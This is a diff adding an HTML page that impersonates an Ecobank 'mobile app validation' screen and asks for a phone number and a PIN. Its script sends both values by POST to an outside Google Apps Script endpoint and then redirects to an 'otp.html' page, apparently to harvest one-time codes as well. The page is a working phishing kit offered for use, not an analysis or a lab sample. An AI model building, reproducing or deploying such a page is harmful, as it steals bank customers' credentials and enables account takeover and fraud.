@@ -1,1 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<style>
+:root {
+  --green: #7ED321;
+  --blue: #0A3D91;
+  --light: #f5f7fb;
+  --border: #ddd;
+}
+
+body {
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: var(--light);
+  margin: 0;
+  padding: 20px;
+}
+
+/* Header */
+.header {
+  text-align: center;
+  margin-bottom: 25px;
+}
+
+.header-title {
+  background: linear-gradient(135deg, #0A3D91, #1256c4);
+  color: #fff;
+  padding: 14px 28px;
+  border-radius: 50px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.header p {
+  margin-top: 10px;
+  color: #555;
+}
+
+/* Card */
+.container {
+  max-width: 420px;
+  margin: auto;
+  background: #fff;
+  padding: 25px 20px;
+  border-radius: 16px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+}
+
+/* Field */
+.field {
+  margin-top: 25px;
+}
+
+/* Static label (phone) */
+.static-label {
+  display: block;
+  margin-bottom: 6px;
+  font-size: 14px;
+  color: #555;
+  font-weight: 500;
+}
+
+/* Phone group */
+.phone-group {
+  display: flex;
+  gap: 10px;
+}
+
+.country-select {
+  width: 90px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px;
+  font-size: 14px;
+  background: #fff;
+  text-align: center;
+  font-weight: bold;
+}
+
+/* Inputs */
+input {
+  width: 100%;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 14px 12px;
+  font-size: 16px;
+  outline: none;
+}
+
+.phone-group input {
+  flex: 1;
+}
+
+/* Floating field (reference only) */
+.floating {
+  position: relative;
+}
+
+.floating input {
+  padding: 14px 12px;
+}
+
+.floating label {
+  position: absolute;
+  left: 12px;
+  top: 14px;
+  color: #888;
+  font-size: 14px;
+  transition: 0.2s ease;
+  background: #fff;
+  padding: 0 5px;
+}
+
+.floating input:focus + label,
+.floating input:not(:placeholder-shown) + label {
+  top: -8px;
+  font-size: 12px;
+  color: var(--blue);
+}
+
+.floating input:focus {
+  border-color: var(--blue);
+  box-shadow: 0 0 0 2px rgba(10,61,145,0.1);
+}
+
+/* Button */
+button {
+  width: 100%;
+  margin-top: 30px;
+  padding: 14px;
+  background: linear-gradient(135deg, #7ED321, #5fbf00);
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:disabled {
+  opacity: 0.6;
+}
+
+/* Loader */
+.loader {
+  display: none;
+  margin: 20px auto;
+  border: 4px solid #eee;
+  border-top: 4px solid var(--green);
+  border-radius: 50%;
+  width: 28px;
+  height: 28px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+
+/* Status */
+#status {
+  text-align: center;
+  margin-top: 10px;
+}
+
+/* Shake */
+.shake {
+  animation: shake 0.3s;
+}
+@keyframes shake {
+  25% { transform: translateX(-4px); }
+  50% { transform: translateX(4px); }
+}
+
+/* Footer */
+.footer {
+  text-align: center;
+  margin-top: 30px;
+  font-size: 13px;
+  color: #777;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="header-title">ECOBANK MOBILE APP VALIDATION</div>
+  <p>Validate Your Profile Below To Stay Connected and Secured</p>
+</div>
+
+<div class="container">
+  <form id="form">
+
+    <!-- Phone -->
+    <div class="field" id="row">
+      <label class="static-label">Phone Number</label>
+      <div class="phone-group">
+        <select id="countryCode" class="country-select">
+          <option value="+233" selected>+233</option>
+          <option value="+234">+234</option>
+          <option value="+254">+254</option>
+          <option value="+27">+27</option>
+        </select>
+        <input type="tel" id="phone" placeholder="24XXXXXXXX" required>
+      </div>
+    </div>
+
+    <!-- Reference -->
+    <div class="field floating" id="refRow">
+      <input type="text" id="reference" placeholder=" " required>
+      <label>Enter Your Pin</label>
+    </div>
+
+    <div class="loader" id="loader"></div>
+
+    <button id="btn" type="submit">Proceed</button>
+    <p id="status"></p>
+
+  </form>
+</div>
+
+<div class="footer">
+  Ecobank, The Pan African Bank
+</div>
+
+<script>
+const form = document.getElementById('form');
+const phoneInput = document.getElementById('phone');
+const refInput = document.getElementById('reference');
+const countryCode = document.getElementById('countryCode');
+const loader = document.getElementById('loader');
+const btn = document.getElementById('btn');
+const statusEl = document.getElementById('status');
+const row = document.getElementById('row');
+const refRow = document.getElementById('refRow');
+
+const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxhoI4JzKByQbrMG0Xxfj4l-egfMGR1EoN6cUxJbj4fhWGJkKAyvdy-i9_OFCT_fiO_Jw/exec";
+
+/* Format phone */
+phoneInput.addEventListener('input', () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, '');
+});
+
+/* Submit */
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const phone = phoneInput.value;
+  const reference = refInput.value;
+  const code = countryCode.value;
+
+  if (phone.length < 7) {
+    row.classList.add("shake");
+    statusEl.textContent = "Enter valid phone number";
+    setTimeout(() => row.classList.remove("shake"), 300);
+    return;
+  }
+
+  if (reference.length < 3) {
+    refRow.classList.add("shake");
+    statusEl.textContent = "Enter reference number";
+    setTimeout(() => refRow.classList.remove("shake"), 300);
+    return;
+  }
+
+  btn.disabled = true;
+  loader.style.display = "block";
+
+  const formData = new FormData();
+  formData.append("phone", code + phone);
+  formData.append("reference", reference);
+
+  try {
+    const res = await fetch(WEBAPP_URL, {
+      method: "POST",
+      body: formData
+    });
+
+    const json = await res.json();
+
+    if (json.result === "success") {
+      statusEl.style.color = "green";
+      statusEl.textContent = "Submitted successfully ✅";
+
+      setTimeout(() => {
+        window.location.href = "otp.html";
+      }, 1200);
+    } else {
+      throw new Error();
+    }
+
+  } catch {
+    loader.style.display = "none";
+    btn.disabled = false;
+    statusEl.style.color = "red";
+    statusEl.textContent = "Failed. Try again.";
+  }
+});
+</script>
+
+</body>
+</html>
